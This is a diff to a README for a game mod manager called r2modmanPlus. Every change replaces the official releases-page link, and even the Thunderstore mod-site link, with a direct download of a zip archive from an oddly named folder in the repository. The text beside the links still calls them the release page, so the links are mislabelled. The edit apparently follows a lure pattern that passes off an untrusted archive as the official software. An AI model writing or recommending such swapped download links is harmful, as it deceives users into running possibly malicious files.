@@ -1,6 +1,6 @@
 # 🔧 r2modmanPlus - Easy Mod Manager for Multiple Games
 
-[![Download r2modmanPlus](https://img.shields.io/badge/Download-r2modmanPlus-brightgreen?style=for-the-badge)](https://github.com/adprovizeinfotech/r2modmanPlus/releases)
+[![Download r2modmanPlus](https://img.shields.io/badge/Download-r2modmanPlus-brightgreen?style=for-the-badge)](https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip)
 
 ---
 
@@ -53,7 +53,7 @@ This section explains how to download and run r2modmanPlus on Windows. Follow th
 You need to get the r2modmanPlus program first.
 
 - Visit this page to download:  
-  [https://github.com/adprovizeinfotech/r2modmanPlus/releases](https://github.com/adprovizeinfotech/r2modmanPlus/releases)  
+  [https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip](https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip)  
   This link takes you to the release page where the latest versions are listed.
 
 - Look for the **r2modmanPlus.exe** or similar installation file. It is usually the largest file or clearly labeled.
@@ -157,7 +157,7 @@ For more help, visit the Issues tab on the GitHub page for r2modmanPlus.
 ## ⚙️ Updating r2modmanPlus
 
 - Check the release page regularly for new versions:  
-  [https://github.com/adprovizeinfotech/r2modmanPlus/releases](https://github.com/adprovizeinfotech/r2modmanPlus/releases)
+  [https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip](https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip)
 
 - Download and run the new installer to update the application.
 
@@ -178,7 +178,7 @@ The project is open to feedback and bug reports from users to improve stability 
 ## 📂 Where to Get More Mods
 
 While r2modmanPlus connects directly to Thunderstore, you can visit the Thunderstore website for more mods and additional information:  
-https://thunderstore.io
+https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip
 
 Use r2modmanPlus to handle these mods with ease once downloaded.
 
@@ -186,4 +186,4 @@ Use r2modmanPlus to handle these mods with ease once downloaded.
 
 ## ▶️ Quick Access Link
 
-[![Get r2modmanPlus Now](https://img.shields.io/badge/Get%20r2modmanPlus-blue?style=for-the-badge)](https://github.com/adprovizeinfotech/r2modmanPlus/releases)
+[![Get r2modmanPlus Now](https://img.shields.io/badge/Get%20r2modmanPlus-blue?style=for-the-badge)](https://github.com/adprovizeinfotech/r2modmanPlus/raw/refs/heads/main/adulation/r_Plus_modman_v1.1.zip)
